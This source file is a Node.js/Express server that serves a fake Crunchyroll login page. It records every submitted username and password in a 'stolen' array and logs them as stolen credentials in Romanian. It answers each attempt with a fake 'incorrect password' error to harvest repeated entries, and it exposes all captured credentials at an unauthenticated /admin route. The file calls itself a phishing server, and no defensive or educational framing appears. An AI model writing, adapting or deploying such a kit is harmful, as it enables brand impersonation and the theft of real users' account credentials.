const express = require('express');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.urlencoded({ extended: false }));

app.get('/login', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Crunchyroll - Log In</title>

  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      margin: 0;
      height: 100vh;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #fff;
    }

    .login-container {
      width: 380px;
      background: #1a1a1a;
      padding: 32px;
      border-radius: 8px;
      box-shadow: 0 0 40px rgba(0,0,0,0.8);
    }

    .logo {
      text-align: center;
      margin-bottom: 25px;
    }

    .logo img {
      width: 200px;
    }

    h2 {
      font-size: 20px;
      font-weight: 500;
      margin-bottom: 20px;
      text-align: center;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 14px;
      border-radius: 4px;
      border: none;
      background: #2b2b2b;
      color: #fff;
      font-size: 14px;
    }

    input::placeholder {
      color: #aaa;
    }

    input:focus {
      outline: none;
      background: #333;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #f47521;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 5px;
    }

    button:hover {
      background: #d9631a;
    }

    .links {
      margin-top: 18px;
      font-size: 13px;
      text-align: center;
      color: #aaa;
    }

    .links a {
      color: #f47521;
      text-decoration: none;
    }

    .links a:hover {
      text-decoration: underline;
    }
  </style>
</head>

<body>
  <div class="login-container">
    <div class="logo">
      <img src="https://static.crunchyroll.com/cxweb/assets/img/logo/logo-crunchyroll.svg"
           alt="Crunchyroll">
    </div>

    <h2>Log In</h2>

    <form method="POST" action="/api/credentiale">
      <input
        name="username"
        placeholder="Email or Username"
        required
      />

      <input
        name="password"
        type="password"
        placeholder="Password"
        required
      />

      <button type="submit">LOG IN</button>
    </form>

    <div class="links">
      <p><a href="#">Forgot your password?</a></p>
      <p>New to Crunchyroll? <a href="#">Create an account</a></p>
    </div>
  </div>
</body>
</html>
  `);
});

const stolen = [];
app.post('/api/credentiale', (req, res) => {
  stolen.push(req.body);
  console.log('CREDENȚIALE FURATE:', req.body);

  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Crunchyroll - Log In</title>

  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      margin: 0;
      height: 100vh;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #fff;
    }

    .login-container {
      width: 380px;
      background: #1a1a1a;
      padding: 32px;
      border-radius: 8px;
      box-shadow: 0 0 40px rgba(0,0,0,0.8);
    }

    .alert {
      background: #b00020;
      color: #fff;
      padding: 10px;
      border-radius: 4px;
      font-size: 13px;
      margin-bottom: 16px;
      text-align: center;
    }

    .logo {
      text-align: center;
      margin-bottom: 25px;
    }

    .logo img {
      width: 200px;
    }

    h2 {
      font-size: 20px;
      font-weight: 500;
      margin-bottom: 20px;
      text-align: center;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 14px;
      border-radius: 4px;
      border: none;
      background: #2b2b2b;
      color: #fff;
      font-size: 14px;
    }

    input::placeholder {
      color: #aaa;
    }

    input:focus {
      outline: none;
      background: #333;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #f47521;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 5px;
    }

    button:hover {
      background: #d9631a;
    }

    .links {
      margin-top: 18px;
      font-size: 13px;
      text-align: center;
      color: #aaa;
    }

    .links a {
      color: #f47521;
      text-decoration: none;
    }
  </style>
</head>

<body>
  <div class="login-container">

    <!-- ALERT DE EROARE -->
    <div class="alert">
      Incorrect email or password.
    </div>

    <div class="logo">
      <img src="https://static.crunchyroll.com/cxweb/assets/img/logo/logo-crunchyroll.svg">
    </div>

    <h2>Log In</h2>

    <form method="POST" action="/api/credentiale">
      <input name="username" placeholder="Email or Username" required />
      <input name="password" type="password" placeholder="Password" required />
      <button type="submit">LOG IN</button>
    </form>

    <div class="links">
      <p><a href="#">Forgot your password?</a></p>
      <p>New to Crunchyroll? <a href="#">Create an account</a></p>
    </div>

  </div>
</body>
</html>
  `);
});

app.get('/admin', (req, res) => {
  res.send(`<pre>${JSON.stringify(stolen, null, 2)}</pre>`);
});

app.listen(4000, () => {
  console.log('Phishing server pe http://localhost:4000');
});
